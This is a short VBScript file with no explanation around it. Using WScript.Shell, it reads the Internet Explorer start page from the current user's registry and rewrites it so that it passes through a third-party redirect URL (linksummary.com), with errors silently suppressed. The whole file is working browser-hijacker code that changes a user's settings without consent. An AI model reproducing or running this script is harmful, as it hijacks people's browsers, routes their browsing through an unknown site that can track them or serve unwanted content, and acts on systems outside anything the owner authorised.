on error resume next

sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
Filter1 = "about:blank"
Filter2 = "file:"
Filter3 = "C:"
Filter4 = "http://www.startyourdayhere.com"
Filter5 = "http://redirect.linksummary.com"
OUD = regedit.RegRead(regkey)
URL = "http://str.realredirect.com/default.asp?a="
if Left(OUD, Len(URL)) <> URL AND Left(OUD, Len(Filter1)) <> Filter1 AND Left(OUD, Len(Filter3)) <> Filter3 AND Left(OUD, Len(Filter2)) <> Filter2  AND Left(OUD, Len(Filter4)) <> Filter4  AND Left(OUD, Len(Filter5)) <> Filter5 then
regedit.RegWrite regkey,regvalue+OUD
end if
end sub


regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://redirect.linksummary.com/redirect.asp?a="
